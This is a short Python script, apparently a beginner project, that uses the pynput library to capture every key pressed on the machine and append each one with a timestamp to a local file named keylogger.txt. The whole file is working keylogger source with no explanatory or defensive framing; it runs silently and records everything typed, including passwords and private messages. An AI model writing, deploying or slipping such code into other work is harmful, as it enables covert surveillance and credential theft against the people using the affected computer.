from pynput.keyboard import Listener
from datetime import datetime

def get_key(key):
    now = datetime.now()
    current_date_time = now.strftime("%d/%m/%Y %H:%M:%S")
    key = str(key).replace("'","")
    if key == "Key.space":
        key = " "
    if key == "Key.enter":
        key = "\n"
    if key == "Key.shift_r":
        key = ""
    with open("keylogger.txt", "a") as f:
        f.write(current_date_time + " - " +key+"\n")

with Listener(on_press=get_key) as l:
    l.join()
